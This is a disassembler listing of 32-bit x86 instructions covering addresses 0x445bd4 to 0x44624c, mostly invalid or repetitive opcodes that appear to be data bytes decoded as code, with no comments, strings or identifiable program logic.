  445bd4:	xor    BYTE PTR [esi],dl
  445bd6:	call   FWORD PTR [eax+ebp*1]
  445bd9:	notrack call DWORD PTR [eax+eiz*1]
  445bdd:	dec    edi
  445bde:	call   DWORD PTR [ebx]
  445be0:	pop    ds
  445be1:	inc    edi
  445be2:	dec    DWORD PTR [ebx]
  445be4:	or     eax,0x600ffa5
  445be9:	fdiv   st(7),st
  445beb:	add    BYTE PTR [esi],cl
  445bed:	icebp  
  445bee:	call   DWORD PTR [edx]
  445bf0:	(bad)  
  445bf3:	and    DWORD PTR [ecx],ebx
  445bf5:	cmp    bh,bh
  445bf7:	adc    cl,BYTE PTR ds:0xff23
  445bfd:	add    bh,bh
  445bff:	add    BYTE PTR [eax],cl
  445c01:	daa    
  445c02:	call   DWORD PTR ds:0x21ff2e20
  445c08:	and    DWORD PTR [ecx],edi
  445c0a:	inc    DWORD PTR [eax]
  445c0c:	sbb    ah,cl
  445c0e:	inc    DWORD PTR [eax]
  445c10:	adc    eax,0x1111ffff
  445c15:	outs   dx,DWORD PTR ds:[esi]
  445c16:	call   DWORD PTR [edx]
  445c18:	adc    DWORD PTR ds:0x431311ff,edx
  445c1e:	call   DWORD PTR [edx]
  445c20:	pop    ss
  445c21:	xor    edi,edi
  445c23:	push   ss
  445c24:	sbb    cl,BYTE PTR [edi+edi*8-0xbf1f4]
  445c2b:	add    BYTE PTR [eax],al
  445c2d:	mov    bh,bh
  445c2f:	add    BYTE PTR [eax],al
  445c31:	dec    esp
  445c32:	inc    DWORD PTR [eax]
  445c34:	add    BYTE PTR [esi],ah
  445c36:	inc    DWORD PTR [eax]
  445c38:	add    BYTE PTR ds:0x20000ff,cl
  445c3e:	inc    DWORD PTR [eax]
  445c40:	add    BYTE PTR [edi],al
  445c42:	inc    DWORD PTR [eax]
  445c44:	add    BYTE PTR [edi+edi*8],dl
  445c47:	add    BYTE PTR [eax],al
  445c49:	sub    edi,edi
  445c4b:	add    BYTE PTR [eax],al
  445c4d:	dec    esp
  445c4e:	inc    DWORD PTR [ecx]
  445c50:	add    ah,BYTE PTR [edx-0xd8f001]
  445c56:	dec    DWORD PTR [edi]
  445c58:	sub    al,0xad
  445c5a:	dec    DWORD PTR [esi]
  445c5c:	adc    DWORD PTR [eax],eax
  445c5e:	dec    DWORD PTR [edi]
  445c60:	adc    esi,DWORD PTR [edi]
  445c62:	dec    DWORD PTR ds:0xfff4413
  445c68:	adc    edi,DWORD PTR [ecx]
  445c6a:	call   DWORD PTR [ecx]
  445c6c:	pop    ss
  445c6d:	sub    eax,0x1b0e0cff
  445c72:	call   DWORD PTR [eax]
  445c74:	push   cs
  445c75:	popa   
  445c76:	inc    DWORD PTR [edi]
  445c78:	or     al,0x78
  445c7a:	inc    DWORD PTR [ecx+eax*1]
  445c7d:	mov    ebx,0xcc0400ff
  445c82:	inc    DWORD PTR [eax]
  445c84:	adc    eax,0x301fffd
  445c89:	jecxz  0x445c8a
  445c8b:	push   es
  445c8c:	add    bl,bl
  445c8e:	inc    DWORD PTR [eax]
  445c90:	add    bh,cl
  445c92:	call   FWORD PTR ds:0x10ff1d19
  445c98:	adc    BYTE PTR [edi+edi*8],al
  445c9b:	sbb    BYTE PTR es:[ecx],cl
  445c9e:	call   FWORD PTR [ebx]
  445ca0:	adc    DWORD PTR [edi],edi
  445ca2:	call   FWORD PTR [edi]
  445ca4:	sub    ah,BYTE PTR [edi+edi*8+0x24]
  445ca8:	and    al,0x3e
  445caa:	call   FWORD PTR [eax]
  445cac:	adc    ch,BYTE PTR ds:0xa21119ff
  445cb2:	inc    DWORD PTR [edi]
  445cb4:	sbb    edx,ecx
  445cb6:	inc    DWORD PTR [eax]
  445cb8:	and    eax,0x1f00fff2
  445cbd:	cld    
  445cbe:	inc    DWORD PTR [eax]
  445cc0:	or     edx,edi
  445cc2:	inc    DWORD PTR [eax]
  445cc4:	add    ah,ch
  445cc6:	inc    DWORD PTR [eax]
  445cc8:	add    BYTE PTR [edi+0x7f0000ff],bl
  445cce:	inc    DWORD PTR [eax]
  445cd0:	add    BYTE PTR [edi-0x1],ch
  445cd3:	add    BYTE PTR [eax],al
  445cd5:	inc    WORD PTR [eax]
  445cd8:	add    ch,BYTE PTR [eax-0x1]
  445cdb:	add    BYTE PTR [eax],al
  445cdd:	pop    edi
  445cde:	inc    DWORD PTR [eax]
  445ce0:	add    BYTE PTR [eax-0x1],bl
  445ce3:	add    BYTE PTR [eax],al
  445ce5:	dec    esp
  445ce6:	inc    DWORD PTR [eax]
  445ce8:	add    BYTE PTR [edi],bh
  445cea:	inc    DWORD PTR [eax]
  445cec:	add    BYTE PTR [esi],ch
  445cee:	inc    DWORD PTR [eax]
  445cf0:	add    BYTE PTR [edi],bl
  445cf2:	inc    DWORD PTR [eax]
  445cf4:	add    BYTE PTR [ebx],dl
  445cf6:	inc    DWORD PTR [eax]
  445cf8:	add    BYTE PTR [edx],cl
  445cfa:	inc    DWORD PTR [eax]
  445cfc:	add    BYTE PTR ds:0x20000ff,al
  445d02:	inc    DWORD PTR [eax]
  445d04:	add    BYTE PTR [eax],al
  445d06:	inc    DWORD PTR [eax]
  445d08:	add    BYTE PTR [eax],al
  445d0a:	inc    DWORD PTR [eax]
  445d0c:	add    BYTE PTR [eax],al
  445d0e:	inc    DWORD PTR [eax]
  445d10:	add    BYTE PTR [eax],al
  445d12:	inc    DWORD PTR [eax]
  445d14:	add    BYTE PTR [eax],al
  445d16:	inc    DWORD PTR [eax]
  445d18:	add    BYTE PTR [eax],al
  445d1a:	inc    DWORD PTR [eax]
  445d1c:	add    BYTE PTR [eax],al
  445d1e:	inc    DWORD PTR [eax]
  445d20:	add    BYTE PTR [eax],al
  445d22:	inc    DWORD PTR [eax]
  445d24:	add    BYTE PTR [eax],al
  445d26:	inc    DWORD PTR [eax]
  445d28:	add    BYTE PTR [eax],al
  445d2a:	inc    DWORD PTR [eax]
  445d2c:	add    BYTE PTR [eax],al
  445d2e:	inc    DWORD PTR [eax]
  445d30:	add    BYTE PTR [eax],al
  445d32:	inc    DWORD PTR [eax]
  445d34:	add    BYTE PTR [eax],al
  445d36:	inc    DWORD PTR [eax]
  445d38:	add    BYTE PTR [eax],al
  445d3a:	inc    DWORD PTR [eax]
  445d3c:	add    BYTE PTR [eax],al
  445d3e:	inc    DWORD PTR [eax]
  445d40:	add    BYTE PTR [eax],al
  445d42:	inc    DWORD PTR [eax]
  445d44:	add    BYTE PTR [eax],al
  445d46:	inc    DWORD PTR [eax]
  445d48:	add    BYTE PTR [eax],al
  445d4a:	inc    DWORD PTR [eax]
  445d4c:	add    BYTE PTR [eax],al
  445d4e:	inc    DWORD PTR [eax]
  445d50:	add    BYTE PTR [eax],al
  445d52:	inc    DWORD PTR [eax]
  445d54:	add    BYTE PTR [eax],al
  445d56:	inc    DWORD PTR [eax]
  445d58:	add    BYTE PTR [eax],al
  445d5a:	inc    DWORD PTR [eax]
  445d5c:	add    BYTE PTR [eax],al
  445d5e:	inc    DWORD PTR [eax]
  445d60:	add    BYTE PTR [eax],al
  445d62:	inc    DWORD PTR [eax]
  445d64:	add    BYTE PTR [eax],al
  445d66:	inc    DWORD PTR [eax]
  445d68:	add    BYTE PTR [eax],al
  445d6a:	inc    DWORD PTR [eax]
  445d6c:	add    BYTE PTR [eax],al
  445d6e:	inc    DWORD PTR [eax]
  445d70:	add    BYTE PTR [eax],al
  445d72:	inc    DWORD PTR [eax]
  445d74:	add    BYTE PTR [eax],al
  445d76:	inc    DWORD PTR [eax]
  445d78:	add    BYTE PTR [eax],al
  445d7a:	inc    DWORD PTR [eax]
  445d7c:	add    BYTE PTR [eax],al
  445d7e:	inc    DWORD PTR [eax]
  445d80:	add    BYTE PTR [eax],al
  445d82:	inc    DWORD PTR [eax]
  445d84:	add    BYTE PTR [ecx],al
  445d86:	inc    DWORD PTR [eax]
  445d88:	add    BYTE PTR [edi+edi*8],al
  445d8b:	add    BYTE PTR [eax],al
  445d8d:	or     bh,bh
  445d8f:	add    BYTE PTR [eax],al
  445d91:	ud0    eax,DWORD PTR [eax]
  445d94:	add    BYTE PTR [esi],dl
  445d96:	inc    DWORD PTR [eax]
  445d98:	add    BYTE PTR [edi],bl
  445d9a:	inc    DWORD PTR [eax]
  445d9c:	add    BYTE PTR [edi],ah
  445d9e:	inc    DWORD PTR [eax]
  445da0:	add    BYTE PTR [esi],ch
  445da2:	inc    DWORD PTR [eax]
  445da4:	add    BYTE PTR [edi+edi*8],dh
  445da7:	add    BYTE PTR [eax],al
  445da9:	cmp    eax,0x450000ff
  445dae:	inc    DWORD PTR [eax]
  445db0:	add    BYTE PTR [edx-0x1],cl
  445db3:	add    BYTE PTR [eax],al
  445db5:	dec    ebx
  445db6:	inc    DWORD PTR [eax]
  445db8:	add    BYTE PTR [ebx-0x1],dl
  445dbb:	add    BYTE PTR [eax],al
  445dbd:	aas    
  445dbe:	inc    DWORD PTR [eax]
  445dc0:	add    BYTE PTR [edi-0x1],al
  445dc3:	add    BYTE PTR [eax],al
  445dc5:	push   edi
  445dc6:	inc    DWORD PTR [eax]
  445dc8:	add    BYTE PTR [ebp-0x1],bh
  445dcb:	add    BYTE PTR [eax],al
  445dcd:	idiv   bh
  445dcf:	add    al,0xd
  445dd1:	sar    edi,cl
  445dd3:	bndstx [edi-0x1],(bad)
  445dd7:	or     edx,DWORD PTR [ecx]
  445dd9:	test   edi,edi
  445ddb:	or     eax,0x13ff8918
  445de0:	and    DWORD PTR [ebx-0x1],esp
  445de3:	or     DWORD PTR [ebx],ecx
  445de5:	out    0xff,al
  445de7:	add    DWORD PTR [ebx],eax
  445de9:	sar    edi,1
  445deb:	add    BYTE PTR [eax],al
  445ded:	mov    eax,0xf80f00ff
  445df2:	call   DWORD PTR [eax]
  445df4:	adc    BYTE PTR [edx+0x1e1832ff],ah
  445dfa:	jmp    FWORD PTR [edx]
  445dfc:	push   ss
  445dfd:	and    eax,0x15152cff
  445e02:	jmp    DWORD PTR [eax]
  445e04:	and    esp,DWORD PTR [esi-0x2dafa01]
  445e0a:	inc    DWORD PTR [eax]
  445e0c:	sbb    edi,esi
  445e0e:	inc    DWORD PTR [eax]
  445e10:	sbb    edi,edi
  445e12:	dec    DWORD PTR [ebx]
  445e14:	es (bad) 
  445e16:	dec    DWORD PTR ds:0xaff9911
  445e1c:	adc    ch,cl
  445e1e:	dec    DWORD PTR [ebx]
  445e20:	adc    ebp,eax
  445e22:	dec    DWORD PTR ds:0xbffea13
  445e28:	adc    esi,ebx
  445e2a:	inc    DWORD PTR [eax]
  445e2c:	add    DWORD PTR [ebp-0x1],esi
  445e2f:	add    BYTE PTR [eax],al
  445e31:	inc    eax
  445e32:	inc    DWORD PTR [eax]
  445e34:	add    BYTE PTR [eax],ah
  445e36:	inc    DWORD PTR [eax]
  445e38:	add    BYTE PTR [ebx],cl
  445e3a:	inc    DWORD PTR [eax]
  445e3c:	add    BYTE PTR [edx],al
  445e3e:	inc    DWORD PTR [eax]
  445e40:	add    BYTE PTR [eax],cl
  445e42:	inc    DWORD PTR [eax]
  445e44:	add    BYTE PTR [edi],dl
  445e46:	inc    DWORD PTR [eax]
  445e48:	add    BYTE PTR [esi],ch
  445e4a:	inc    DWORD PTR [ecx]
  445e4c:	add    DWORD PTR [eax-0xfffd01],ebx
  445e52:	dec    DWORD PTR [ebx]
  445e54:	or     eax,0x2815ffff
  445e59:	repnz inc DWORD PTR [ecx]
  445e5c:	adc    ebp,esp
  445e5e:	dec    DWORD PTR [eax]
  445e60:	adc    cl,dl
  445e62:	inc    DWORD PTR [edi]
  445e64:	adc    bl,BYTE PTR [eax-0x4aeef601]
  445e6a:	dec    DWORD PTR [ecx]
  445e6c:	or     ebp,DWORD PTR [ebp-0x40f1f701]
  445e72:	dec    DWORD PTR [edx]
  445e74:	or     ebp,edx
  445e76:	inc    DWORD PTR [edx]
  445e78:	push   ss
  445e79:	(bad)  
  445e7a:	inc    DWORD PTR [eax]
  445e7c:	sbb    dl,bh
  445e7e:	inc    DWORD PTR [eax]
  445e80:	sbb    eax,0x600ffff
  445e85:	out    0xff,eax
  445e87:	add    eax,0xffe401
  445e8c:	add    esp,esp
  445e8e:	inc    DWORD PTR [eax]
  445e90:	add    BYTE PTR [edi+edi*8-0x37f800],al
  445e97:	add    BYTE PTR [ebx+eiz*8],cl
  445e9a:	inc    DWORD PTR [eax]
  445e9c:	add    ah,dl
  445e9e:	inc    DWORD PTR [eax]
  445ea0:	add    ah,dh
  445ea2:	inc    DWORD PTR [eax]
  445ea4:	or     edi,esi
  445ea6:	inc    DWORD PTR [esi]
  445ea8:	or     al,0xc5
  445eaa:	inc    DWORD PTR ds:0xffdf04
  445eb0:	add    bh,ah
  445eb2:	inc    DWORD PTR [eax]
  445eb4:	add    ch,dh
  445eb6:	inc    DWORD PTR [eax]
  445eb8:	and    dl,ah
  445eba:	inc    DWORD PTR [ebx]
  445ebc:	adc    edx,ecx
  445ebe:	inc    DWORD PTR [eax]
  445ec0:	push   cs
  445ec1:	mov    bh,0xff
  445ec3:	add    eax,0xff8410
  445ec8:	add    BYTE PTR [eax-0x1],ah
  445ecb:	add    BYTE PTR [eax],al
  445ecd:	dec    esi
  445ece:	inc    DWORD PTR [eax]
  445ed0:	add    BYTE PTR [ecx-0x1],al
  445ed3:	add    BYTE PTR [eax],al
  445ed5:	aaa    
  445ed6:	inc    DWORD PTR [eax]
  445ed8:	add    BYTE PTR [edi+edi*8],dh
  445edb:	add    BYTE PTR [eax],al
  445edd:	xor    edi,edi
  445edf:	add    BYTE PTR [eax],al
  445ee1:	sub    al,0xff
  445ee3:	add    BYTE PTR [eax],al
  445ee5:	and    eax,0x1d0000ff
  445eea:	inc    DWORD PTR [eax]
  445eec:	add    BYTE PTR [ebx],dl
  445eee:	inc    DWORD PTR [eax]
  445ef0:	add    BYTE PTR [ebx],cl
  445ef2:	inc    DWORD PTR [eax]
  445ef4:	add    BYTE PTR [esi],al
  445ef6:	inc    DWORD PTR [eax]
  445ef8:	add    BYTE PTR [edx],al
  445efa:	inc    DWORD PTR [eax]
  445efc:	add    BYTE PTR [eax],al
  445efe:	inc    DWORD PTR [eax]
  445f00:	add    BYTE PTR [eax],al
  445f02:	inc    DWORD PTR [eax]
  445f04:	add    BYTE PTR [eax],al
  445f06:	inc    DWORD PTR [eax]
  445f08:	add    BYTE PTR [eax],al
  445f0a:	inc    DWORD PTR [eax]
  445f0c:	add    BYTE PTR [eax],al
  445f0e:	inc    DWORD PTR [eax]
  445f10:	add    BYTE PTR [eax],al
  445f12:	inc    DWORD PTR [eax]
  445f14:	add    BYTE PTR [eax],al
  445f16:	inc    DWORD PTR [eax]
  445f18:	add    BYTE PTR [eax],al
  445f1a:	inc    DWORD PTR [eax]
  445f1c:	add    BYTE PTR [eax],al
  445f1e:	inc    DWORD PTR [eax]
  445f20:	add    BYTE PTR [eax],al
  445f22:	inc    DWORD PTR [eax]
  445f24:	add    BYTE PTR [eax],al
  445f26:	inc    DWORD PTR [eax]
  445f28:	add    BYTE PTR [eax],al
  445f2a:	inc    DWORD PTR [eax]
  445f2c:	add    BYTE PTR [eax],al
  445f2e:	inc    DWORD PTR [eax]
  445f30:	add    BYTE PTR [eax],al
  445f32:	inc    DWORD PTR [eax]
  445f34:	add    BYTE PTR [eax],al
  445f36:	inc    DWORD PTR [eax]
  445f38:	add    BYTE PTR [eax],al
  445f3a:	inc    DWORD PTR [eax]
  445f3c:	add    BYTE PTR [eax],al
  445f3e:	inc    DWORD PTR [eax]
  445f40:	add    BYTE PTR [eax],al
  445f42:	inc    DWORD PTR [eax]
  445f44:	add    BYTE PTR [eax],al
  445f46:	inc    DWORD PTR [eax]
  445f48:	add    BYTE PTR [eax],al
  445f4a:	inc    DWORD PTR [eax]
  445f4c:	add    BYTE PTR [eax],al
  445f4e:	inc    DWORD PTR [eax]
  445f50:	add    BYTE PTR [eax],al
  445f52:	inc    DWORD PTR [eax]
  445f54:	add    BYTE PTR [eax],al
  445f56:	inc    DWORD PTR [eax]
  445f58:	add    BYTE PTR [eax],al
  445f5a:	inc    DWORD PTR [eax]
  445f5c:	add    BYTE PTR [eax],al
  445f5e:	inc    DWORD PTR [eax]
  445f60:	add    BYTE PTR [eax],al
  445f62:	inc    DWORD PTR [eax]
  445f64:	add    BYTE PTR [eax],al
  445f66:	inc    DWORD PTR [eax]
  445f68:	add    BYTE PTR [eax],al
  445f6a:	inc    DWORD PTR [eax]
  445f6c:	add    BYTE PTR [eax],al
  445f6e:	inc    DWORD PTR [eax]
  445f70:	add    BYTE PTR [eax],al
  445f72:	inc    DWORD PTR [eax]
  445f74:	add    BYTE PTR [eax],al
  445f76:	inc    DWORD PTR [eax]
  445f78:	add    BYTE PTR [eax],al
  445f7a:	inc    DWORD PTR [eax]
  445f7c:	add    BYTE PTR [eax],al
  445f7e:	inc    DWORD PTR [eax]
  445f80:	add    BYTE PTR [eax],al
  445f82:	inc    DWORD PTR [eax]
  445f84:	add    BYTE PTR [eax],al
  445f86:	inc    DWORD PTR [eax]
  445f88:	add    BYTE PTR [eax],al
  445f8a:	inc    DWORD PTR [eax]
  445f8c:	add    BYTE PTR [edx],al
  445f8e:	inc    DWORD PTR [eax]
  445f90:	add    BYTE PTR [edi+edi*8],al
  445f93:	add    BYTE PTR [eax],al
  445f95:	push   es
  445f96:	inc    DWORD PTR [eax]
  445f98:	add    BYTE PTR [edx],cl
  445f9a:	inc    DWORD PTR [eax]
  445f9c:	add    BYTE PTR ds:0x100000ff,cl
  445fa2:	inc    DWORD PTR [eax]
  445fa4:	add    BYTE PTR [edi+edi*8],dl
  445fa7:	add    BYTE PTR [eax],al
  445fa9:	sbb    edi,edi
  445fab:	add    BYTE PTR [eax],al
  445fad:	and    bh,bh
  445faf:	add    BYTE PTR [eax],al
  445fb1:	and    al,0xff
  445fb3:	add    BYTE PTR [eax],al
  445fb5:	daa    
  445fb6:	inc    DWORD PTR [eax]
  445fb8:	add    BYTE PTR [edi],ah
  445fba:	inc    DWORD PTR [eax]
  445fbc:	add    BYTE PTR [eax],ch
  445fbe:	inc    DWORD PTR [eax]
  445fc0:	add    BYTE PTR [esi],ch
  445fc2:	inc    DWORD PTR [eax]
  445fc4:	add    BYTE PTR [edi+edi*8],bh
  445fc7:	add    BYTE PTR [eax],al
  445fc9:	push   ebx
  445fca:	inc    DWORD PTR [ecx]
  445fcc:	add    DWORD PTR [edx-0x43fcfe01],esp
  445fd2:	inc    DWORD PTR [ebx]
  445fd4:	or     DWORD PTR [edi-0x38fafd01],edi
  445fda:	inc    DWORD PTR [edx]
  445fdc:	add    eax,0x901ffd9
  445fe1:	enter  0x1ff,0x2
  445fe5:	aam    0xff
  445fe7:	push   es
  445fe8:	add    al,0xa8
  445fea:	inc    DWORD PTR [eax]
  445fec:	add    BYTE PTR [eax-0x45faff01],bl
  445ff2:	inc    DWORD PTR [eax]
  445ff4:	or     al,bl
  445ff6:	inc    DWORD PTR [eax]
  445ff8:	adc    al,dh
  445ffa:	inc    DWORD PTR [ebx]
  445ffc:	or     dh,cl
  445ffe:	inc    DWORD PTR [ebx]
  446000:	pop    es
  446001:	in     al,0xff
  446003:	add    al,0x6
  446005:	out    0xff,al
  446007:	add    DWORD PTR [edi],eax
  446009:	(bad)  
  44600a:	inc    DWORD PTR [eax]
  44600c:	or     ebp,ecx
  44600e:	inc    DWORD PTR [eax]
  446010:	or     eax,0x802ffe4
  446015:	fdiv   st(7),st
  446017:	add    al,0x5
  446019:	(bad)  
  44601b:	add    al,0x6
  44601d:	loop   0x44601e
  44601f:	add    eax,0x5ffd806
  446024:	pop    es
  446025:	sar    edi,cl
  446027:	add    eax,DWORD PTR ds:0xffb0
  44602d:	push   ebx
  44602e:	inc    DWORD PTR [eax]
  446030:	add    BYTE PTR [esi],ch
  446032:	inc    DWORD PTR [eax]
  446034:	add    BYTE PTR [eax],bl
  446036:	inc    DWORD PTR [eax]
  446038:	add    BYTE PTR [eax],cl
  44603a:	inc    DWORD PTR [eax]
  44603c:	add    BYTE PTR [edx],al
  44603e:	inc    DWORD PTR [eax]
  446040:	add    BYTE PTR [eax],cl
  446042:	inc    DWORD PTR [eax]
  446044:	add    BYTE PTR ds:0x280000ff,dl
  44604a:	inc    DWORD PTR [ecx]
  44604c:	add    DWORD PTR [edi+edi*8-0x38fcfd],ecx
  446053:	add    al,BYTE PTR [eax]
  446055:	aad    0xff
  446057:	add    al,BYTE PTR [eax]
  446059:	(bad)  
  44605b:	add    eax,DWORD PTR [eax]
  44605d:	(bad)  
  44605f:	add    eax,DWORD PTR [ecx]
  446061:	in     al,0xff
  446063:	add    eax,DWORD PTR [ecx]
  446065:	loope  0x446066
  446067:	add    al,BYTE PTR [ecx]
  446069:	out    0xff,al
  44606b:	add    al,BYTE PTR [ecx]
  44606d:	in     al,0xff
  44606f:	add    al,BYTE PTR [ecx]
  446071:	out    0xff,al
  446073:	add    al,BYTE PTR [eax]
  446075:	in     al,0xff
  446077:	add    DWORD PTR [ecx],eax
  446079:	loop   0x44607a
  44607b:	add    al,BYTE PTR [eax]
  44607d:	in     al,0xff
  44607f:	pop    es
  446080:	or     cl,ah
  446082:	dec    DWORD PTR [eax]
  446084:	adc    ebp,DWORD PTR [ebx-0x22feff01]
  44608a:	inc    DWORD PTR [eax]
  44608c:	add    ch,bl
  44608e:	inc    DWORD PTR [eax]
  446090:	add    al,ah
  446092:	inc    DWORD PTR [eax]
  446094:	add    al,al
  446096:	inc    DWORD PTR [eax]
  446098:	pop    es
  446099:	(bad)  
  44609a:	inc    DWORD PTR [eax]
  44609c:	or     eax,ebp
  44609e:	inc    DWORD PTR [eax]
  4460a0:	adc    edi,DWORD PTR [esi-0x44f3ff01]
  4460a6:	inc    DWORD PTR [eax]
  4460a8:	or     eax,0xffaf
  4460ad:	lods   al,BYTE PTR ds:[esi]
  4460ae:	inc    DWORD PTR [eax]
  4460b0:	add    BYTE PTR [edx-0x65ffff01],ah
  4460b6:	inc    DWORD PTR [eax]
  4460b8:	add    DWORD PTR [eax+0x750000ff],ecx
  4460be:	inc    DWORD PTR [eax]
  4460c0:	add    BYTE PTR [edx-0x1],ah
  4460c3:	add    BYTE PTR [eax],al
  4460c5:	dec    esi
  4460c6:	inc    DWORD PTR [eax]
  4460c8:	add    BYTE PTR [edx],bh
  4460ca:	inc    DWORD PTR [eax]
  4460cc:	add    BYTE PTR [edx],ch
  4460ce:	inc    DWORD PTR [eax]
  4460d0:	add    BYTE PTR [edi],bl
  4460d2:	inc    DWORD PTR [eax]
  4460d4:	add    BYTE PTR [eax],bl
  4460d6:	inc    DWORD PTR [eax]
  4460d8:	add    BYTE PTR ds:0x130000ff,dl
  4460de:	inc    DWORD PTR [eax]
  4460e0:	add    BYTE PTR [eax],dl
  4460e2:	inc    DWORD PTR [eax]
  4460e4:	add    BYTE PTR ds:0xa0000ff,cl
  4460ea:	inc    DWORD PTR [eax]
  4460ec:	add    BYTE PTR [esi],al
  4460ee:	inc    DWORD PTR [eax]
  4460f0:	add    BYTE PTR [ebx],al
  4460f2:	inc    DWORD PTR [eax]
  4460f4:	add    BYTE PTR [ecx],al
  4460f6:	inc    DWORD PTR [eax]
  4460f8:	add    BYTE PTR [eax],al
  4460fa:	inc    DWORD PTR [eax]
  4460fc:	add    BYTE PTR [eax],al
  4460fe:	inc    DWORD PTR [eax]
  446100:	add    BYTE PTR [eax],al
  446102:	inc    DWORD PTR [eax]
  446104:	add    BYTE PTR [eax],al
  446106:	inc    DWORD PTR [eax]
  446108:	add    BYTE PTR [eax],al
  44610a:	inc    DWORD PTR [eax]
  44610c:	add    BYTE PTR [eax],al
  44610e:	inc    DWORD PTR [eax]
  446110:	add    BYTE PTR [eax],al
  446112:	inc    DWORD PTR [eax]
  446114:	add    BYTE PTR [eax],al
  446116:	inc    DWORD PTR [eax]
  446118:	add    BYTE PTR [eax],al
  44611a:	inc    DWORD PTR [eax]
  44611c:	add    BYTE PTR [eax],al
  44611e:	inc    DWORD PTR [eax]
  446120:	add    BYTE PTR [eax],al
  446122:	inc    DWORD PTR [eax]
  446124:	add    BYTE PTR [eax],al
  446126:	inc    DWORD PTR [eax]
  446128:	add    BYTE PTR [eax],al
  44612a:	inc    DWORD PTR [eax]
  44612c:	add    BYTE PTR [eax],al
  44612e:	inc    DWORD PTR [eax]
  446130:	add    BYTE PTR [eax],al
  446132:	inc    DWORD PTR [eax]
  446134:	add    BYTE PTR [eax],al
  446136:	inc    DWORD PTR [eax]
  446138:	add    BYTE PTR [eax],al
  44613a:	inc    DWORD PTR [eax]
  44613c:	add    BYTE PTR [eax],al
  44613e:	inc    DWORD PTR [eax]
  446140:	add    BYTE PTR [eax],al
  446142:	inc    DWORD PTR [eax]
  446144:	add    BYTE PTR [eax],al
  446146:	inc    DWORD PTR [eax]
  446148:	add    BYTE PTR [eax],al
  44614a:	inc    DWORD PTR [eax]
  44614c:	add    BYTE PTR [eax],al
  44614e:	inc    DWORD PTR [eax]
  446150:	add    BYTE PTR [eax],al
  446152:	inc    DWORD PTR [eax]
  446154:	add    BYTE PTR [eax],al
  446156:	inc    DWORD PTR [eax]
  446158:	add    BYTE PTR [eax],al
  44615a:	inc    DWORD PTR [eax]
  44615c:	add    BYTE PTR [eax],al
  44615e:	inc    DWORD PTR [eax]
  446160:	add    BYTE PTR [eax],al
  446162:	inc    DWORD PTR [eax]
  446164:	add    BYTE PTR [eax],al
  446166:	inc    DWORD PTR [eax]
  446168:	add    BYTE PTR [eax],al
  44616a:	inc    DWORD PTR [eax]
  44616c:	add    BYTE PTR [eax],al
  44616e:	inc    DWORD PTR [eax]
  446170:	add    BYTE PTR [eax],al
  446172:	inc    DWORD PTR [eax]
  446174:	add    BYTE PTR [eax],al
  446176:	inc    DWORD PTR [eax]
  446178:	add    BYTE PTR [eax],al
  44617a:	inc    DWORD PTR [eax]
  44617c:	add    BYTE PTR [eax],al
  44617e:	inc    DWORD PTR [eax]
  446180:	add    BYTE PTR [eax],al
  446182:	inc    DWORD PTR [eax]
  446184:	add    BYTE PTR [eax],al
  446186:	inc    DWORD PTR [eax]
  446188:	add    BYTE PTR [eax],al
  44618a:	inc    DWORD PTR [eax]
  44618c:	add    BYTE PTR [eax],al
  44618e:	inc    DWORD PTR [eax]
  446190:	add    BYTE PTR [eax],al
  446192:	inc    DWORD PTR [eax]
  446194:	add    BYTE PTR [eax],al
  446196:	inc    DWORD PTR [eax]
  446198:	add    BYTE PTR [eax],al
  44619a:	inc    DWORD PTR [eax]
  44619c:	add    BYTE PTR [ecx],al
  44619e:	inc    DWORD PTR [eax]
  4461a0:	add    BYTE PTR [edx],al
  4461a2:	inc    DWORD PTR [eax]
  4461a4:	add    BYTE PTR [ebx],al
  4461a6:	inc    DWORD PTR [eax]
  4461a8:	add    BYTE PTR [esi],al
  4461aa:	inc    DWORD PTR [eax]
  4461ac:	add    BYTE PTR [edx],cl
  4461ae:	inc    DWORD PTR [eax]
  4461b0:	add    BYTE PTR ds:0xf0000ff,cl
  4461b6:	inc    DWORD PTR [eax]
  4461b8:	add    BYTE PTR [ecx],dl
  4461ba:	inc    DWORD PTR [eax]
  4461bc:	add    BYTE PTR [edi+edi*8],dl
  4461bf:	add    BYTE PTR [eax],al
  4461c1:	sbb    edi,edi
  4461c3:	add    BYTE PTR [eax],al
  4461c5:	and    al,0xff
  4461c7:	add    BYTE PTR [eax],al
  4461c9:	xor    al,0xff
  4461cb:	add    BYTE PTR [eax],al
  4461cd:	dec    eax
  4461ce:	inc    DWORD PTR [eax]
  4461d0:	add    BYTE PTR [edx-0x1],bl
  4461d3:	add    BYTE PTR [eax],al
  4461d5:	imul   edi,edi,0xff710000
  4461db:	add    BYTE PTR [eax],al
  4461dd:	jno    0x4461de
  4461df:	add    BYTE PTR [eax],al
  4461e1:	imul   edi,edi,0x0
  4461e4:	add    BYTE PTR [edi+edi*8+0x0],ah
  4461e8:	add    BYTE PTR [edi-0x1],bl
  4461eb:	add    BYTE PTR [eax],al
  4461ed:	pop    edi
  4461ee:	inc    DWORD PTR [eax]
  4461f0:	add    BYTE PTR [ebp-0x1],ah
  4461f3:	add    BYTE PTR [eax],al
  4461f5:	ins    DWORD PTR es:[edi],dx
  4461f6:	inc    DWORD PTR [eax]
  4461f8:	add    al,BYTE PTR [edi-0x73fdff01]
  4461fe:	inc    DWORD PTR [eax]
  446200:	add    BYTE PTR [edi-0x1],bh
  446203:	add    BYTE PTR [eax],al
  446205:	jg     0x446206
  446207:	add    BYTE PTR [eax],al
  446209:	jge    0x44620a
  44620b:	add    BYTE PTR [eax],al
  44620d:	jnp    0x44620e
  44620f:	add    BYTE PTR [eax],al
  446211:	jp     0x446212
  446213:	add    BYTE PTR [eax],al
  446215:	jp     0x446216
  446217:	add    BYTE PTR [eax],al
  446219:	jns    0x44621a
  44621b:	add    BYTE PTR [eax],al
  44621d:	jne    0x44621e
  44621f:	add    BYTE PTR [eax],al
  446221:	imul   edi,edi,0x0
  446224:	add    BYTE PTR [ebp-0x1],bl
  446227:	add    BYTE PTR [eax],al
  446229:	dec    ecx
  44622a:	inc    DWORD PTR [eax]
  44622c:	add    BYTE PTR [ecx],dh
  44622e:	inc    DWORD PTR [eax]
  446230:	add    BYTE PTR [esi],bl
  446232:	inc    DWORD PTR [eax]
  446234:	add    BYTE PTR [edi],cl
  446236:	inc    DWORD PTR [eax]
  446238:	add    BYTE PTR ds:0x10000ff,al
  44623e:	inc    DWORD PTR [eax]
  446240:	add    BYTE PTR [esi],al
  446242:	inc    DWORD PTR [eax]
  446244:	add    BYTE PTR [eax],dl
  446246:	inc    DWORD PTR [eax]
  446248:	add    BYTE PTR [esi],bl
  44624a:	inc    DWORD PTR [eax]
  44624c:	add    BYTE PTR [ecx],dh
